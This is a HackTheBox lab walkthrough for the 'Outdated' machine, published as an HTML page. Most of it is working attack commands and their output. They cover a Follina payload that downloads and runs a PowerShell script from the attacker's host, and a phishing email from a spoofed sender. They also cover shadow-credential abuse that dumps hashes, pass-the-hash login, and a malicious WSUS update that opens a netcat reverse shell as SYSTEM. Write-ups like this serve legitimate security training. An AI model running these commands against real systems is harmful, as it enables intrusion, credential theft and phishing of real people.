@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html>
+<div id="particles-js">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!--  Essential META Tags -->
+<meta property="og:title" content="Outdated HackTheBox Writeup">
+<meta name="description" content="Outdated HackTheBox Writeup | 0xv01d">
+<meta property="og:type" content="article" />
+<meta property="og:image" content="/images/HTB/outdated/outdated_card.png">
+<meta property="og:url" content="https://0xv01d.github.io/hackthebox/outdated">
+<meta name="twitter:card" content="/images/HTB/outdated/outdated_card.png">
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/Scripts/js/particles.js"></script>
+    <script src="/Scripts/js/app.js"></script>
+<title>Outdated HackTheBox Writeup | 0xv01d</title>
+<meta property="og:locale" content="en_US">
+<script type="application/ld+json">
+</script>
+
+    <link rel="stylesheet" href="/Styles/style.css?v=">
+	<link rel="stylesheet" href="/Styles/highlight_monokai.css">
+<!-- Setup Google Analytics -->
+
+	<link rel="shortcut icon" type="image/x-icon" href="/images/HTB/outdated/favicon.ico">
+
+<!--Information Sidebar-->
+
+  </head>
+  <body>
+      <header class="app-header">
+        <a href="https:0xv01d.github.io">
+          <img class="avatar" src="/images/index/avatar.png">
+		</a><p></p>
+		<h1><strong>0xv01d</strong></h1>
+		<nav class="app-header-menu">
+			<a class="app-header-menu-item" href="/">Home</a>
+             - 
+			<a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+			<a class="app-header-menu-item" href="/about/">About</a>
+		</nav>
+		<p>Just another computer adict.</p>
+		<div text-align:="" center;="" width:="" 100%;="" class="app-header-media">
+			<a class="fab fa-github-square" href="https://github.com/0xv01d" rel="noreferrer noopener" target="_blank"><img src="/images/index/github.png"></a>
+			<a class="fab fa-envelope-square" href="mailto:im_0xv01d@outlook.com" rel="noreferrer noopener" target="_blank"><img src="/images/index/email.png"></img></a>
+			<a href="https://discord.com/users/504974900239400961" class="fab fa-discord" rel="noreferrer noopener" target="_blank"></a>
+			<a class="fab fa-twitter-square" href="https://twitter.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a>
+		</div>
+        <a href="https://www.hackthebox.com/profile/1120840" rel="noreferrer noopener" target="_blank">
+			<img src="http://www.hackthebox.eu/badge/image/1120840" alt="Hack The Box">
+        </a>
+        <div style="height: 7rem;"></div>
+      </header>
+
+      <main class="app-container">
+		
+		<article class="post">		
+			<header class="post-header">
+
+	
+<!--Machine Title-->
+			<div class="title">Outdated Walkthrough</div>
+<!--Skill Tags-->								
+			<div class="tag-skills">
+				<svg class="icon icon-tag svg-tag" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+					<title>tag</title>
+					<path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" x2="7.01" y1="7" y2="7"></line>
+				</svg>
+				<a class="tag" href="#">SMB</a>
+				<a class="tag" href="#">Follina</a>
+				<a class="tag" href="#">SMTP</a>
+				<a class="tag" href="#">BloodHound</a>
+				<a class="tag" href="#">Shadow Credentials</a>
+				<a class="tag" href="#">Lateral Movement</a>
+				<a class="tag" href="#">TGT</a>
+				<a class="tag" href="#">Winrm</a>
+				<a class="tag" href="#">WSUS</a>
+			</div>
+
+			</header>
+
+<!--Machine Card-->			
+			<div><img class="machine-card" style="max-width: 595px;" src="/images/HTB/outdated/outdated_card.png"></img></div>
+			
+<!--Machine Overview-->
+			<div class="subtitle">Outdated Overview</div>
+			<p class="paragraph"><a href="https://app.hackthebox.com/machines/Outdated" rel="noreferrer noopener" target="_blank">Outdated</a> machine on HackTheBox, submitted by
+			<a href="https://app.hackthebox.com/users/168546" rel="noreferrer noopener" target="_blank">ctrlzero</a>. The machine starts with a SMB share, where we can find a pdf reporting some vulerabilities, including <a href="https://github.com/chvancooten/follina.py" rel="nonreferrer noopener" target="_blank">follina</a>, which we are going to exploit by SMTP through a malicious email, gaining access to the machine.
+			Then we're going to exploit shadow credentials to move laterally to the next user. Finally we'are going to inject a malicious update to <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services-wsus" rel="nonreferrer noopener" target="_blank">WSUS</a> and getting a shell as nt authority system.
+
+<!--Machine Resolution-->
+			<h1 id="header-1">Recon</h1>
+
+  	          <p class="head-img">As always let's start with a portscan, we have many ports open, and we can realize that we are facing an AD, we have a lot to start with, but first let's save the domains reported by nmap, outdated.htb and mail.outdated.htb in the /etc/hosts</p>
+            <img class="img-post" style="max-width: 1262px;" src="/images/HTB/outdated/nmap1.png">
+            <img class="img-post" style="max-width: 1262px;" src="/images/HTB/outdated/nmap2.png">
+            <img class="img-post" style="max-width: 1262px;" src="/images/HTB/outdated/nmap3.png">
+            <img class="img-post" style="max-width: 1262px;" src="/images/HTB/outdated/nmap4.png">
+            <img class="img-post" style="max-width: 1262px;" src="/images/HTB/outdated/nmap5.png">
+            <img class="img-post" style="max-width: 1262px;" src="/images/HTB/outdated/nmap6.png">
+            <img class="img-post" style="max-width: 1262px;" src="/images/HTB/outdated/nmap7.png">
+
+
+			<p class="head-img">As we can see, we can connect via smb using a NULL session, and also we get the domain SID</p>
+		<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> enum4linux</span> outdated.htb
+<------------------------------------->
+ ===================================== 
+|    Session Check on outdated.htb    |
+ ===================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
+[+] Server outdated.htb allows sessions using username '', password ''
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
+[+] Got domain/workgroup name: 
+
+ =========================================== 
+|    Getting domain SID for outdated.htb    |
+ =========================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
+Domain Name: OUTDATED
+Domain Sid: S-1-5-21-4089647348-67660539-4016542185
+[+] Host is part of a domain (not a workgroup)
+<-------------------------------------->
+</span>	</code></pre></div></div>
+
+            <p class="head-img">Listing the smb shares we find a pdf</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> smbclient</span> -N \\\\outdated.htb\\Shares
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Mon Jun 20 11:01:33 2022
+  ..                                  D        0  Mon Jun 20 11:01:33 2022
+  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 11:00:32 2022
+
+		9116415 blocks of size 4096. 1942495 blocks available
+smb: \> get NOC_Reminder.pdf
+getting file \NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (43.8 KiloBytes/sec) (average 43.8 KiloBytes/sec)
+smb: \> quit
+</span> </code></pre></div></div>
+
+			<p class="head-img">We find a valid email and a list of CVEs, one of them corresponds to <a href="https://github.com/chvancooten/follina.py" rel="noreferrer noopener" target="_blank">follina</a>, and since smtp is open we can test this vector</p>
+            <img class="img-post" style="max-width: 877px;" src="/images/HTB/outdated/pdf_smb.png"></img>
+
+            <p class="head-img">Let's run the follina.py that will create a server with our payload which will create a Net.WebClient object to download the shell as a string and execute it as a Powershell command, let's download it and save it as index.html, so we can mount a new server and wait for the shell request</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">sudo python3</span> follina.py -m command -t rtf -c <span class="k">"IEX(New-Object Net.WebClient).downloadString('http://10.10.16.42/shell.ps1')"</span>
+[sudo] password for 0xv01d:
+Generated 'clickme.rtf' in current directory
+Generated 'exploit.html' in 'www' directory
+Serving payload on http://localhost:80/exploit.html
+127.0.0.1 - - [14/Oct/2022 22:30:30] "GET /exploit.html HTTP/1.1" 200 -
+
+<span class="na">❯ </span><span class="kt">curl</span> -s http://localhost/exploit.html -o index.html
+</span> </code></pre></div></div>
+
+            <p class="head-img">So, now let's mount the server where the index.html and the <a href="https://github.com/antonioCoco/ConPtyShell" rel="noreferrer noopener" target="_blank">shell</a> are placed, and then send the email to itsupport, remember to set the listener before</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">sudo python3</span> -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.175 - - [14/Oct/2022 22:32:41] "GET / HTTP/1.1" 200 -
+10.10.11.175 - - [14/Oct/2022 22:32:44] "GET /shell.ps1 HTTP/1.1" 200 -
+
+<span class="na">❯ </span><span class="kt">swaks</span> --to itsupport@outdated.htb --from SOC@0utdated.htb --server mail.outdated.htb --body <span class="k">"Is that your operation? http://10.10.16.42/"</span>
+=== Trying mail.outdated.htb:25...
+=== Connected to mail.outdated.htb.
+<-  220 mail.outdated.htb ESMTP
+ -> EHLO Anima
+<-  250-mail.outdated.htb
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN
+<-  250 HELP
+ -> MAIL FROM:<SOC@0utdated.htb>
+<-  250 OK
+ -> RCPT TO:<itsupport@outdated.htb>
+<-  250 OK
+ -> DATA
+<-  354 OK, send.
+ -> Date: Fri, 14 Oct 2022 22:32:17 -0500
+ -> To: itsupport@outdated.htb
+ -> From: SOC@0utdated.htb
+ -> Subject: test Fri, 14 Oct 2022 22:32:17 -0500
+ -> Message-Id: <20221225175317.078944@Anima>
+ -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
+ -> 
+ -> Is that your operation? http://10.10.16.42/
+ -> 
+ -> 
+ -> .
+<-  250 Queued (10.528 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+
+<span class="na">❯ </span><span class="kt">stty</span> raw -echo; (<span class="kt">stty</span> size; <span class="kt">cat</span>) | <span class="kt">nc</span> -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.42] from (UNKNOWN) [10.10.11.175] 49827
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+<span class="k">PS C:\Users\btables\AppData\Local\Temp\SDIAG_a75c5a63-f148-4b64-9b5b-b6a81cfe0db5></span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Digging a bit we find out that we're in a vm</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">PS C:\> SystemInfo</span>
+<.............................................>
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Microsoft Hyper-V Network Adapter
+                                 Connection Name: Ethernet
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 172.16.20.20
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+<.............................................>
+</span> </code></pre></div></div>
+
+
+            <p class="head-img">Let's upload <a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/SharpHound.exe" rel="nonreferrer noopener" target="_blank">SharpHound</a> to enumerate a bit</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">PS C:\programdata></span> curl http://10.10.16.41/SharpHound.exe -o SharpHound.exe
+<span class="k">PS C:\programdata></span> .\SharpHound.exe -c all
+<.............................................>
+ |INFORMATION|SharpHound Enumeration Completed at 23:24 PM on 14/10/2022! Happy Graphing!
+</span> </code></pre></div></div>
+
+
+            <p class="head-img">Now let's transfer the results via smb</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">PS C:\programdata></span> copy 20221226212452_BloodHound.zip \\10.10.16.42\share\
+
+<span class="na">❯ </span><span class="kt">sudo impacket-smbserver </span>-smb2support share $(<span class="kt">pwd</span>)
+[sudo] password for 0xv01d:
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.11.175,49802)
+[*] AUTHENTICATE_MESSAGE (OUTDATED\btables,CLIENT)
+[*] User CLIENT\btables authenticated successfully
+[*] btables::OUTDATED:aaaaaaaaaaaaaaaa:74cf9363650cf90184ee7da13f78120f:0101000000000000000bd5b47119d9012f1e3b22fa005d9b0000000001001000720051004f006f0065006b005400590003001000720051004f006f0065006b0054005900020010006b00660047007a004a00560071006900040010006b00660047007a004a0056007100690007000800000bd5b47119d90106000400020000000800300030000000000000000000000000200000d3fc8a21718b26022944e21ed1889b894c9f706931b8a001b3666a1fadb67ae10a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00340031000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:share)
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:share)
+[*] Closing down connection (10.10.11.175,49802)
+[*] Remaining connections []
+
+<span class="na">❯ </span><span class="kt">mv</span> ./20221226212452_BloodHound.zip ../content
+</span> </code></pre></div></div>
+
+            <p class="head-img">Once we upload the zip to <a href="https://github.com/BloodHoundAD/BloodHound"  rel="nonreferrer noopener" target="_blank">bloodhound</a>, we can notice that there is an AddKeyCredentialLink that we can abuse, which means that we can create shadow credentials and authenticate using kerberos</p>
+            <img class="img-post" style="max-width: 660px;" src="/images/HTB/outdated/bloodhound.png"></img>
+
+            <p class="head-img">For this we'll use <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Whisker.ps1" rel="noreferrer noopener" target="_blank">whisker</a>, let's upload it, and run it, once we did it we'll get a certificate</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">PS C:\programdata> </span>IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.41/Invoke-Whisker.ps1')
+<span class="k">PS C:\programdata> </span>Invoke-Whisker -command "add /target:sflowers /path:C:\programdata\mycert.cer"
+[*] No pass was provided. The certificate will be stored with the password gAakqxmBDc29KC0N
+[*] Searching for the target account
+[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
+[*] Generating certificate
+[*] Certificate generaged
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID 9246b1b3-1288-44a6-a67c-262ed3ee8bf0
+[*] Updating the msDS-KeyCredentialLink attribute of the target object
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Saving the associated certificate to file...
+[*] The associated certificate was saved to C:\programdata\mycert.cer
+[*] You can now run Rubeus with the following syntax:
+
+Rubeus.exe asktgt /user:sflowers /certificate:C:\programdata\mycert.cer /password:"<span class="gd">gAakqxmBDc29KC0N</span>" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
+</span> </code></pre></div></div>
+
+            <p class="head-img">Now let's upload <a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Rubeus.exe" rel="noreferrer noopener" target="_blank">Rubeus</a> to the box, and execute it passing it the cert</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">PS C:\programdata> </span>curl http://10.10.16.41/Rubeus.exe -o Rubeus.exe
+<span class="k">PS C:\programdata> </span>.\Rubeus.exe asktgt /user:sflowers /certificate:C:\programdata\mycert.cer /password:"gAakqxmBDc29KC0N" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1 
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers 
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\sflowers'
+[*] Using domain controller: 172.16.20.1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+	
+      doIF0jCCBc6gAwIBBaEDAgEWooIE5zCCBONhggTfMIIE26ADAgEFoQ4bDE9VVERBVEVELkhUQqIhMB+g
+      <..............................................................................>
+      NDhaqA4bDE9VVERBVEVELkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRi
+
+  ServiceName              :  krbtgt/outdated.htb
+  ServiceRealm             :  OUTDATED.HTB
+  UserName                 :  sflowers
+  UserRealm                :  OUTDATED.HTB
+  StartTime                :  12/27/2022 1:21:48 AM
+  EndTime                  :  12/27/2022 11:21:48 AM
+  RenewTill                :  1/3/2023 1:21:48 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  yVxYPo0C+qRndJ4CKjNFCA==
+  ASREP (key)              :  2143C5E447DA6EDBFD2F5031C62F2D5E
+
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : <span class="gd">1FCDB1F6015DCB318CC77BB2BDA14DB5</span>
+<span class="k">PS C:\programdata></span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Now let's connect us via winrm using the NT hash</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">evil-winrm</span> -i 10.10.11.175 -u sflowers@outdated.htb -H <span class="k">'1FCDB1F6015DCB318CC77BB2BDA14DB5'</span>
+
+<span class="x">Evil-WinRM shell v3.4</span>
+
+<span class="k">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span>
+
+<span class="m">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span>
+
+<span class="x">Info: Establishing connection to remote endpoint</span>
+
+<span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\Users\sflowers\Documents> type c:\Users\sflowers\Desktop\user.txt
+01ad4ead9e9221a28786fb9d26f6a11b
+
+<span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\Users\sflowers\Documents>
+</span> </code></pre></div></div>
+
+            <p class="head-img">After digging a bit we find out that as the endpoint of WSUS is http and we're member of the administrator group, we can easily inject an update, for this task we'll use <a href="https://github.com/nettitude/SharpWSUS" rel="noreferrer noopener" target="_blank">SharpWSUS</a> (you need to compile it and sign it in order to run it on the machine), and also we need to upload <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec" rel="noreferrer noopener" target="_blank">psexec</a></p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> upload SharpWSUS.exe
+<span class="x">Info: Uploading SharpWSUS.exe to C:\programdata\SharpWSUS.exe</span>
+
+                                                             
+<span class="m">Data: 65536 bytes of 65536 bytes copied</span>
+
+<span class="x">Info: Upload successful!</span>
+
+<span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> upload PsExec64.exe
+
+<span class="x">Info: Uploading PsExec64.exe to C:\programdata\PsExec64.exe</span>
+
+                                                             
+<span class="m">Data: 685960 bytes of 685960 bytes copied</span>
+
+
+<span class="x">Info: Upload successful!</span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Now let's upload netcat and create the update to get a reverse shell as nt authority system</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> upload nc.exe
+<span class="x">Info: Uploading nc.exe to C:\programdata\nc.exe</span>
+
+                                                             
+<span class="m">Data: 58260 bytes of 58260 bytes copied</span>
+
+<span class="x">Info: Upload successful!</span>
+
+<span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> .\SharpWSUS.exe create /payload:"c:\programdata\PsExec64.exe" /args:"-accepteula -s -d c:\\programdata\\nc.exe -e cmd 10.10.16.42 9001" /title:"RevShell"
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Create Update
+[*] Creating patch to use the following:
+[*] Payload: PsExec64.exe
+[*] Payload Path: c:\programdata\PsExec64.exe
+[*] Arguments: -accepteula -s -d c:\\programdata\\nc.exe -e cmd 10.10.16.42 9001
+[*] Arguments (HTML Encoded): -accepteula -s -d c:\\programdata\\nc.exe -e cmd 10.10.16.42 9001
+
+################# WSUS Server Enumeration via SQL ##################
+ServerName, WSUSPortNumber, WSUSContentLocation
+-----------------------------------------------
+DC, 8530, c:\WSUS\WsusContent
+
+ImportUpdate
+Update Revision ID: 32
+PrepareXMLtoClient
+InjectURL2Download
+DeploymentRevision
+PrepareBundle
+PrepareBundle Revision ID: 33
+PrepareXMLBundletoClient
+DeploymentRevision
+
+[*] Update created - When ready to deploy use the following command:
+[*] SharpWSUS.exe approve /updateid:27407865-ea93-4263-925d-499c0ae7ab50 /computername:Target.FQDN /groupname:"Group Name"
+
+[*] To check on the update status use the following command:
+[*] SharpWSUS.exe check /updateid:27407865-ea93-4263-925d-499c0ae7ab50 /computername:Target.FQDN
+
+[*] To delete the update use the following command:
+[*] SharpWSUS.exe delete /updateid:27407865-ea93-4263-925d-499c0ae7ab50 /computername:Target.FQDN /groupname:"Group Name"
+
+[*] Create complete
+</span> </code></pre></div></div>
+
+            <p class="head-img">Now let's approve it</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> .\SharpWSUS.exe approve /updateid:27407865-ea93-4263-925d-499c0ae7ab50 /computername:DC.outdated.htb /groupname:"RevShell"
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Approve Update
+
+Targeting DC.outdated.htb
+TargetComputer, ComputerID, TargetID
+------------------------------------
+DC.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
+Group Exists = False
+Group Created: LocalAdmin Update
+Added Computer To Group
+Approved Update
+
+[*] Approve complete
+</span> </code></pre></div></div>
+
+            <p class="head-img">If the update has been installed correctly we should get a shell, and we can read the final flag, by other way, we could check the update state and try it again</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">rlwrap sudo</span> nc -nlvp 9001
+listening on [any] 9001 ...
+connect to [10.10.16.42] from (UNKNOWN) [10.10.11.175] 49827
+
+<span class="k">C:\Windows\system32></span> whoami
+nt authority\system
+
+<span class="k">C:\Windows\system32></span> type c:\Users\Administrator\Desktop\root.txt
+2db5651ae4e3023b21356b7b3b71dc3a
+
+
+
+<span class="ld"><span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> .\SharpWSUS.exe check /updateid:7bc38baf-f1a0-4184-8691-15046bd220a9 /computername:DC.outdated.htb
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Check Update
+
+Targeting DC.outdated.htb
+TargetComputer, ComputerID, TargetID
+------------------------------------
+DC.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
+
+[*] Update is installed
+
+[*] Check complete
+</span> </code></pre></div></div>
+
+<a href="#">Go back</a>
+		</article>
+      </main>
+  </body>
+</div>
+</html>
